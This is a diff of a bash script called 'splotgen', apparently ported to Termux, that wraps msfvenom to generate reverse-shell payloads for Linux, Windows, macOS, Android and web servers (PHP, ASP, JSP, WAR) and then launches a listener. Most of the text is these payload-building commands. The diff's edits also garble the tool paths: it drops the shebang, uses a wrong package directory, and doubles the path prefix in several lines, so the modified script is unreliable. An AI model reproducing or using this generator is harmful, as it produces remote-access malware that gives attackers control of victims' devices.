@@ -1,4 +1,4 @@
-#!/data/data/com.termux/files/usr/bin/bash
+
 figlet splotgen
 
 trap 'printf "\n";stop' 2
@@ -31,8 +31,8 @@ format=""
 
 dependencies() {
 
-command -v msfconsole > /dev/null 2>&1 || { echo >&2 "I require Metasploit but it's not installed. Install it. Aborting."; exit 1; }
-command -v msfvenom > /dev/null 2>&1 || { echo >&2 "I require MSFVenom but it's not installed. Install it. Aborting."; exit 1; }
+command -v /data/data/com.termux.com/files/home/msfconsole > /dev/null 2>&1 || { echo >&2 "I require Metasploit but it's not installed. Install it. Aborting."; exit 1; }
+command -v /data/data/com.termux.com/files/home/msfvenom > /dev/null 2>&1 || { echo >&2 "I require MSFVenom but it's not installed. Install it. Aborting."; exit 1; }
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; 
 exit 1; }
@@ -92,33 +92,33 @@ payload_name="${payload_name:-${default_payload_name}}"
 
 binaries_linux() {
 format=".elf"
-msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f elf > $payload_name.elf
+/data/data/com.termux.com/files/home//data/data/com.termux.com/files/home/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f elf > $payload_name.elf
 
 }
 
 binaries_windows() {
 format=".exe"
-msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f exe > $payload_name.exe
+/data/data/com.termux.com/files/home//data/data/com.termux.com/files/home/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f exe > $payload_name.exe
 
 
 }
 
 binaries_mac() {
 format=".macho"
-msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f macho > $payload_name.macho
+/data/data/com.termux.com/files/home//data/data/com.termux.com/files/home/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f macho > $payload_name.macho
 
 
 }
 
 binaries_Android() {
 format=".apk"
-msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 R > $payload_name.apk
+/data/data/com.termux.com/files/home//data/data/com.termux.com/files/home/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 R > $payload_name.apk
 
 }
 
 binaries_Android_https() {
 format="apk"
-msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 R > $payload_name.apk
+/data/data/com.termux.com/files/home/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 R > $payload_name.apk
 }
 
 binaries() {
@@ -183,41 +183,41 @@ fi
 
 php_payload() {
 format=".php"
-msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.php
+/data/data/com.termux.com/files/home/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.php
 
 }
 
 asp_payload() {
 format=".asp"
-msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.asp
+/data/data/com.termux.com/files/home/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.asp
 }
 
 jsp_payload() {
 format=".jsp"
-msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.jsp
+/data/data/com.termux.com/files/home/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.jsp
 
 }
 war_payload() {
 format=".war"
-msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f war > $payload_name.war
+/data/data/com.termux.com/files/home/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f war > $payload_name.war
 
 }
 
 python_payload(){
 format=".sh"
-msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.$format
+/data/data/com.termux.com/files/home/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.$format
 
 }
 
 bash_payload() {
 format=".sh"
-msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.$format
+/data/data/com.termux.com/files/home/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.$format
 
 }
 
 perl_payload() {
 format=".sh"
-msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.$format
+/data/data/com.termux.com/files/home/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.$format
 }
 
 webpayloads() {
@@ -393,7 +393,7 @@ fi
 
 
 
-msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f $lang > $payload_name
+/data/data/com.termux.com/files/home/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f $lang > $payload_name
 listener
 }
 
@@ -478,4 +478,3 @@ fi
 }
 dependencies
 menu
-
